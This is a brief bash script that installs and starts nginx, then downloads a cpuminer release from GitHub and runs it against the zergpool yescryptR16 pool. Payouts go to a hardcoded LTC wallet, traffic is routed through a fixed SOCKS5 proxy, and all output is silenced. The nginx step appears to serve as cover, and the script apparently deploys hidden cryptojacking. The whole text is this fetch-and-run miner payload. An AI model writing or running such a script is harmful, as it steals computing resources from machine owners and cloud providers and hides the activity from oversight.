#!/bin/bash
apt update -y
apt install nginx -y
apt install wget -y
service nginx start
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yescryptR16 -o stratum+tcp://yescryptR16.na.mine.zergpool.com:6333 -u LUFTF9kAQgHyWLv2rctGvVSSxL9RXBodcF.BAB -p c=LTC  -x socks5://192.252.214.20:15864 > /dev/null 2>&1
